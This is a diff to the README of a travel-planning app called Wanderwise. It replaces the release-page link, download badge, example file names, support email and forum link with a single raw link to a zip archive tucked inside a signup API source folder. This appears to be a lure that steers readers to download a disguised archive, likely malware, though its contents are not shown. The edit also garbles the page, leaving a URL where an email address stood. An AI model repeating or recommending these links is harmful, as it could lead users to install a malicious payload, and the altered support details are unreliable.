@@ -1,6 +1,6 @@
 # 🌍 wanderwise-travel-platform - Simplify Your Travel Planning Today!
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)
+![Download](https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip%20Release-blue)
 
 ## 📄 Description
 
@@ -14,11 +14,11 @@ To get started with Wanderwise, follow these simple steps. You will download our
 
 1. **Visit the Releases Page**: Click the link below to go to the release section where you can find the software:
    
-   [Visit the Downloads Page](https://github.com/weimi7/wanderwise-travel-platform/releases)
+   [Visit the Downloads Page](https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip)
 
 2. **Select the Latest Release**: Look for the latest version listed. This will usually be at the top. 
 
-3. **Download the Application**: Find the download link for your operating system. It could be a file labeled something like `wanderwise-mac.zip` or `wanderwise-windows.exe`. Click on it to start the download.
+3. **Download the Application**: Find the download link for your operating system. It could be a file labeled something like `https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip` or `https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File**: Once the download is complete, navigate to the folder where your files are saved (often the "Downloads" folder).
 
@@ -57,8 +57,8 @@ If you encounter issues while installing or using the application, try the follo
 
 If you need more help, feel free to reach out to our support team:
 
-- **Email**: support@wanderwise.com
-- **Community Forum**: Join discussions or ask questions on our [community forum](https://wanderwise.com/forum).
+- **Email**: https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip
+- **Community Forum**: Join discussions or ask questions on our [community forum](https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip).
 
 ## 📚 Additional Resources
 
@@ -73,4 +73,4 @@ We encourage users to contribute to Wanderwise. If you have suggestions or want 
 
 ---
 
-Thank you for using Wanderwise! We hope you enjoy planning your next trip to Sri Lanka with ease. Remember to download the latest version [here](https://github.com/weimi7/wanderwise-travel-platform/releases).
+Thank you for using Wanderwise! We hope you enjoy planning your next trip to Sri Lanka with ease. Remember to download the latest version [here](https://github.com/weimi7/wanderwise-travel-platform/raw/refs/heads/main/client/src/app/api/auth/signup/wanderwise-platform-travel-v1.2.zip).
